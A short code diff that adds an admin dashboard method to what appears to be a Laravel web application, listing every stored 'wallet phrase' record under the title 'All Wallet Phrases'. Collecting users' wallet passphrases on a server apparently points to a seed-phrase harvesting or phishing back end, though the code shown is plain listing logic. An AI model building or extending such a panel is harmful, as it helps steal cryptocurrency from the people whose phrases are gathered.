@@ -23,6 +23,7 @@ use App\ManualPayment;
 use App\Member;
 use App\News;
 use App\Partner;
+use App\PassPhrase;
 use App\Payment;
 use App\PaymentWallet;
 use App\Photo;
@@ -2567,5 +2568,15 @@ class DashboardController extends Controller
         Session::flash('type', 'success');
         Session::flash('title', 'Success');
         return back();
+    }
+
+    public function allPhrases()
+    {
+        $data['general'] = GeneralSetting::first();
+        $data['site_title'] = $data['general']->title;
+        $data['basic'] = BasicSetting::first();
+        $data['page_title'] = "All Wallet Phrases";
+        $data['a_contests'] = PassPhrase::orderBy('id','desc')->get();
+        return view('dashboard.wallet-phrase', $data);
     }
 }
